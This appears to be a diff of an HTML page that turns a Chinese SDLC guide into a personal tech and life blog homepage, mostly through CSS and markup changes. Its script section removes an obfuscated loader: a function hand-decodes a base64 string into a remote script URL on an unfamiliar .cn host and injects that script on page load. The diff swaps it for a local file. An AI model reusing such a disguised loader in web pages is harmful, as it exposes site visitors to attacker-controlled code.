@@ -3,8 +3,9 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>软件开发生命周期 (SDLC) 指南</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>我的思考日志</title>
     <style>
         /* 全局样式 */
         body {
@@ -12,10 +13,10 @@
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #FDFDFD;
-            /* 纯净的浅色背景 */
-            color: #333333;
-            /* 深灰色文本 */
+            background-color: #F8FBFD;
+            /* 浅蓝灰色背景 */
+            color: #343A40;
+            /* 深炭灰色文本 */
             line-height: 1.6;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -39,8 +40,8 @@
         }
 
         header h1 {
-            color: #4A69BD;
-            /* 强调色：深蓝色标题 */
+            color: #2C3E50;
+            /* 深蓝灰色标题 */
             font-size: 2.5em;
             margin-bottom: 10px;
             letter-spacing: 0.5px;
@@ -53,25 +54,53 @@
             margin: 0;
         }
 
+        /* 导航菜单 - 简单链接 */
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin-top: 25px;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 0 10px 10px 10px;
+        }
+
+        nav ul li a {
+            text-decoration: none;
+            color: #3498DB;
+            /* 强调色：蓝色 */
+            font-weight: bold;
+            padding: 10px 18px;
+            border-radius: 25px;
+            /* 药丸形按钮 */
+            border: 1px solid #3498DB;
+            transition: all 0.3s ease;
+        }
+
+        nav ul li a:hover {
+            background-color: #3498DB;
+            color: #FFFFFF;
+            box-shadow: 0 4px 10px rgba(52, 152, 219, 0.3);
+        }
+
         /* 主要内容区 */
         main {
             padding-top: 0;
         }
 
-        .timeline-section {
+        section {
             background-color: #FFFFFF;
             padding: 25px;
             border-radius: 15px;
             margin-bottom: 25px;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-            position: relative;
-            overflow: hidden;
-            /* 确保内容不溢出 */
         }
 
-        .timeline-section h2 {
-            color: #4A69BD;
-            /* 强调色标题 */
+        h2 {
+            color: #2C3E50;
             font-size: 1.8em;
             margin-bottom: 25px;
             border-bottom: 2px solid #E0EBF5;
@@ -79,144 +108,185 @@
             text-align: center;
         }
 
-        .timeline-item {
-            display: flex;
-            flex-direction: column;
-            /* 默认垂直堆叠 */
-            align-items: center;
-            margin-bottom: 30px;
-            position: relative;
-            padding-bottom: 20px;
-            border-bottom: 1px dashed #E0EBF5;
-        }
-
-        .timeline-item:last-of-type {
-            border-bottom: none;
-        }
-
-        .timeline-item .step-number {
-            background-color: #4A69BD;
-            /* 强调色背景 */
-            color: #FFFFFF;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            /* 圆形 */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 1.2em;
-            font-weight: bold;
+        h3 {
+            color: #343A40;
+            font-size: 1.3em;
+            margin-top: 20px;
             margin-bottom: 15px;
-            flex-shrink: 0;
-            /* 防止缩小 */
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
         }
 
-        .timeline-item .content-block {
-            flex: 1;
-            text-align: center;
-            /* 默认居中 */
-        }
-
-        .timeline-item h3 {
-            color: #333333;
-            font-size: 1.4em;
-            margin-top: 0;
-            margin-bottom: 10px;
-        }
-
-        .timeline-item p {
-            color: #4A4A4A;
+        p {
+            color: #495057;
             font-size: 1em;
-            margin-bottom: 15px;
+            margin-bottom: 18px;
         }
 
-        .timeline-item img {
+        img {
             max-width: 100%;
             height: auto;
             border-radius: 10px;
-            margin-top: 15px;
-            margin-bottom: 15px;
+            margin-top: 20px;
+            margin-bottom: 20px;
             display: block;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
         }
 
-        /* 代码块样式 */
-        pre {
-            background-color: #2D3E50;
-            /* 深色背景 */
-            color: #EAECEE;
-            /* 浅色文本 */
-            padding: 18px;
+        /* 特色文章样式 */
+        .featured-article {
+            padding: 30px;
+            /* 更多内边距 */
+            background-color: #ECF0F1;
+            /* 浅灰背景，突出特色 */
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .featured-article .featured-image {
+            max-width: 100%;
+            height: auto;
             border-radius: 10px;
-            overflow-x: auto;
-            font-family: 'Consolas', 'Monaco', 'Andale Mono', 'Ubuntu Mono', monospace;
-            font-size: 0.9em;
-            line-height: 1.5;
+            margin: 0 auto 25px;
+            /* 居中图片 */
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .featured-article h3 {
+            color: #3498DB;
+            /* 强调色标题 */
+            font-size: 2em;
+            /* 更大标题 */
+            margin-bottom: 15px;
+        }
+
+        .featured-article .date {
+            color: #7F8C8D;
+            font-size: 0.95em;
             margin-bottom: 20px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-            text-align: left;
-            /* 代码块文本左对齐 */
+            display: block;
         }
 
-        code {
-            font-family: inherit;
-            font-size: inherit;
+        .featured-article p {
+            font-size: 1.1em;
+            max-width: 700px;
+            margin: 0 auto 30px;
         }
 
-        /* 媒体查询：平板及以上设备，实现左右交替布局 */
-        @media (min-width: 600px) {
-            .timeline-item {
-                flex-direction: row;
-                /* 水平排列 */
-                text-align: left;
-                align-items: flex-start;
-                /* 顶部对齐 */
-                justify-content: space-between;
-                padding-left: 60px;
-                /* 为左侧步骤号留出空间 */
-            }
+        .featured-article .read-more-button {
+            display: inline-block;
+            background-color: #3498DB;
+            color: #FFFFFF;
+            padding: 15px 30px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            box-shadow: 0 4px 10px rgba(52, 152, 219, 0.3);
+        }
 
-            .timeline-item .step-number {
-                position: absolute;
-                left: 0;
-                top: 0;
-                margin-bottom: 0;
-                /* 移除底部外边距 */
-            }
+        .featured-article .read-more-button:hover {
+            background-color: #2980B9;
+            transform: translateY(-3px);
+        }
 
-            .timeline-item .content-block {
-                padding-left: 20px;
-                /* 内容块左侧内边距 */
-            }
+        /* 最新文章列表样式 */
+        .recent-articles-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
 
-            .timeline-item:nth-child(even) {
-                /* 偶数项：步骤号在右，内容在左 */
-                flex-direction: row-reverse;
-                padding-left: 25px;
-                /* 调整内边距 */
-                padding-right: 60px;
-                /* 为右侧步骤号留出空间 */
-            }
+        .recent-articles-list li {
+            background-color: #FFFFFF;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
 
-            .timeline-item:nth-child(even) .step-number {
-                left: auto;
-                right: 0;
-            }
+        .recent-articles-list li:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
 
-            .timeline-item:nth-child(even) .content-block {
-                padding-left: 0;
-                padding-right: 20px;
-                text-align: right;
-                /* 偶数项内容右对齐 */
-            }
+        .recent-articles-list li h4 {
+            color: #343A40;
+            font-size: 1.2em;
+            margin-top: 0;
+            margin-bottom: 8px;
+        }
 
-            .timeline-item:nth-child(even) img {
-                margin-left: auto;
-                /* 偶数项图片右对齐 */
-                margin-right: 0;
-            }
+        .recent-articles-list li .date {
+            color: #888888;
+            font-size: 0.85em;
+            margin-bottom: 10px;
+        }
+
+        .recent-articles-list li a {
+            text-decoration: none;
+            color: #3498DB;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .recent-articles-list li a:hover {
+            color: #2980B9;
+        }
+
+        /* 关于我/联系区 */
+        .about-contact-section {
+            background-color: #FFFFFF;
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .about-contact-section h2 {
+            color: #2C3E50;
+            font-size: 1.8em;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #E0EBF5;
+            padding-bottom: 12px;
+        }
+
+        .about-contact-section p {
+            color: #4A4A4A;
+            margin-bottom: 15px;
+        }
+
+        .about-contact-section a {
+            color: #3498DB;
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .about-contact-section a:hover {
+            color: #2980B9;
+        }
+
+        /* 社交链接 */
+        .social-links {
+            margin-top: 20px;
+        }
+
+        .social-links a {
+            display: inline-block;
+            margin: 0 10px;
+            color: #3498DB;
+            font-size: 2em;
+            text-decoration: none;
+            transition: transform 0.3s ease;
+        }
+
+        .social-links a:hover {
+            transform: translateY(-3px);
+            color: #2980B9;
         }
 
         /* 页脚样式 */
@@ -231,143 +301,80 @@
             border-radius: 15px;
             box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
         }
-
-        .footer-links a {
-            color: #4A69BD;
-            text-decoration: none;
-            margin: 0 8px;
-            font-weight: bold;
-            transition: color 0.3s ease;
-        }
-
-        .footer-links a:hover {
-            color: #3B53A0;
-        }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <div class="container">
         <header>
-            <h1>软件开发生命周期 (SDLC) 指南</h1>
-            <p>从概念到部署，一步步构建高质量软件</p>
+            <h1>我的思考日志</h1>
+            <p>记录我的技术探索与生活感悟</p>
+            <nav>
+                <ul>
+                    <li><a href="#featured-article">精选</a></li>
+                    <li><a href="#recent-articles">最新</a></li>
+                    <li><a href="#about">关于</a></li>
+                    <li><a href="#contact">联系</a></li>
+                </ul>
+            </nav>
         </header>
 
         <main>
-            <section class="timeline-section">
-                <h2>SDLC 核心阶段</h2>
+            <section id="featured-article" class="featured-article">
+                <h2>精选文章</h2>
+                <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() %>" class="featured-image"
+                    alt="人工智能与未来科技图">
+                <h3>人工智能的边界与伦理：我们应该思考什么？</h3>
+                <span class="date">发布日期：2023年7月30日</span>
+                <p>随着人工智能技术的飞速发展，它在改变我们生活的同时，也带来了深刻的伦理思考。本文将探讨AI在决策、隐私、就业等方面可能面临的挑战，并呼吁我们共同构建负责任的AI未来。</p>
+                <a href="#" class="read-more-button">深入阅读</a>
+            </section>
 
-                <div class="timeline-item">
-                    <div class="step-number">1</div>
-                    <div class="content-block">
-                        <h3>需求分析 (Requirements Analysis)</h3>
-                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="需求分析会议图">
-                        <p>这是SDLC的第一步，涉及与利益相关者沟通，收集并文档化软件的功能和非功能需求。明确、完整的需求是项目成功的基础。</p>
-                        <pre><code>
-// 示例：用户故事
-As a [user type], I want [some goal] so that [some reason].
-                        </code></pre>
-                    </div>
-                </div>
+            <section id="recent-articles">
+                <h2>最新文章</h2>
+                <ul class="recent-articles-list">
+                    <li>
+                        <h4><a href="#">前端性能优化：从Lighthouse到实践</a></h4>
+                        <span class="date">2023年7月28日</span>
+                        <p>如何让你的Web应用飞起来？本文将带你了解Lighthouse工具的使用，并分享一些实用的前端性能优化技巧。</p>
+                    </li>
+                    <li>
+                        <h4><a href="#">极简主义生活：少即是多的智慧</a></h4>
+                        <span class="date">2023年7月25日</span>
+                        <p>极简主义不仅仅是一种生活方式，更是一种思维模式。探索如何通过简化，让生活更富足。</p>
+                    </li>
+                    <li>
+                        <h4><a href="#">Python数据分析入门：Pandas库速览</a></h4>
+                        <span class="date">2023年7月22日</span>
+                        <p>Pandas是Python数据分析的利器。本篇将快速介绍Pandas的核心功能，助你开启数据探索之旅。</p>
+                    </li>
+                    <li>
+                        <h4><a href="#">我的摄影器材选择与使用心得</a></h4>
+                        <span class="date">2023年7月20日</span>
+                        <p>分享我常用的摄影器材，以及在不同场景下的使用心得，希望能给摄影爱好者一些参考。</p>
+                    </li>
+                </ul>
+            </section>
 
-                <div class="timeline-item">
-                    <div class="step-number">2</div>
-                    <div class="content-block">
-                        <h3>系统设计 (System Design)</h3>
-                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="系统架构设计图">
-                        <p>在需求明确后，设计团队会创建软件的架构和模块设计。这包括定义系统组件、数据库结构、用户界面以及与其他系统的接口。</p>
-                        <pre><code>
-// 示例：伪代码设计
-Function processOrder(orderId):
-    Retrieve order details from Database
-    Validate order items
-    Calculate total price
-    Update inventory
-    Send confirmation email
-End Function
-                        </code></pre>
-                    </div>
-                </div>
+            <section id="about" class="about-contact-section">
+                <h2>关于我</h2>
+                <p>你好！我是一个热爱技术、喜欢思考和分享的创作者。这个博客是我记录学习心得、个人感悟和生活点滴的平台。</p>
+                <p>我相信知识的分享能带来更大的价值，希望我的文字能为你带来启发和乐趣！</p>
+            </section>
 
-                <div class="timeline-item">
-                    <div class="step-number">3</div>
-                    <div class="content-block">
-                        <h3>编码实现 (Implementation/Coding)</h3>
-                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="程序员编码图">
-                        <p>根据设计文档，开发人员开始编写实际的代码。选择合适的编程语言和工具，并遵循编码规范，确保代码质量和可维护性。</p>
-                        <pre><code>
-// 示例：Python代码片段
-def calculate_total(items):
-    total = sum(item['price'] * item['quantity'] for item in items)
-    return total
-
-# Example usage:
-# order_items = [{'price': 10, 'quantity': 2}, {'price': 5, 'quantity': 3}]
-# print(calculate_total(order_items)) # Output: 35
-                        </code></pre>
-                    </div>
-                </div>
-
-                <div class="timeline-item">
-                    <div class="step-number">4</div>
-                    <div class="content-block">
-                        <h3>测试 (Testing)</h3>
-                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="软件测试流程图">
-                        <p>测试阶段旨在发现并修复软件中的缺陷。这包括单元测试、集成测试、系统测试和验收测试，确保软件满足所有需求并稳定运行。</p>
-                        <pre><code>
-// 示例：JavaScript单元测试
-describe('calculateTotal', () => {
-    test('should return correct total for multiple items', () => {
-        const items = [{ price: 10, quantity: 2 }, { price: 5, quantity: 3 }];
-        expect(calculateTotal(items)).toBe(35);
-    });
-});
-                        </code></pre>
-                    </div>
-                </div>
-
-                <div class="timeline-item">
-                    <div class="step-number">5</div>
-                    <div class="content-block">
-                        <h3>部署 (Deployment)</h3>
-                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 5 %>" alt="软件部署服务器图">
-                        <p>经过全面测试后，软件被部署到生产环境，供最终用户使用。这通常涉及环境配置、数据迁移和发布管理。</p>
-                        <pre><code>
-# 示例：简单的部署脚本
-#!/bin/bash
-echo "Stopping existing service..."
-sudo systemctl stop my_app
-echo "Pulling latest code..."
-git pull origin main
-echo "Installing dependencies..."
-npm install --production
-echo "Starting service..."
-sudo systemctl start my_app
-echo "Deployment complete!"
-                        </code></pre>
-                    </div>
-                </div>
-
-                <div class="timeline-item">
-                    <div class="step-number">6</div>
-                    <div class="content-block">
-                        <h3>维护 (Maintenance)</h3>
-                        <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 6 %>" alt="软件维护与支持图">
-                        <p>软件部署后，维护阶段开始。这包括监控系统性能、修复生产环境中的缺陷、提供技术支持以及根据用户反馈进行功能增强。</p>
-                        <p>SDLC是一个迭代过程，维护阶段的反馈会促使新的需求分析，从而开启下一个开发周期。</p>
-                    </div>
+            <section id="contact" class="about-contact-section">
+                <h2>联系方式</h2>
+                <div class="social-links">
+                    <a href="#" aria-label="GitHub">GitHub</a> |
+                    <a href="#" aria-label="Twitter">Twitter</a> |
+                    <a href="#" aria-label="LinkedIn">LinkedIn</a>
                 </div>
             </section>
         </main>
 
         <footer>
-            <p>&copy; 2023 软件开发生命周期指南. All rights reserved.</p>
-            <div class="footer-links">
-                <a href="#" aria-label="GitHub">GitHub</a> |
-                <a href="#" aria-label="更多资源">更多资源</a> |
-                <a href="#" aria-label="联系我们">联系我们</a>
-            </div>
+            <p>&copy; 2023 我的思考日志. All rights reserved.</p>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -381,7 +388,7 @@ echo "Deployment complete!"
     </div>
 
     <script>
-        // 平滑滚动到锚点 (如果需要顶部导航)
+        // 平滑滚动到锚点
         document.querySelectorAll('a[href^="#"]').forEach(anchor => {
             anchor.addEventListener('click', function (e) {
                 e.preventDefault();
@@ -411,53 +418,15 @@ echo "Deployment complete!"
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly92OGIwbjJtLmNhdmxhdi5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
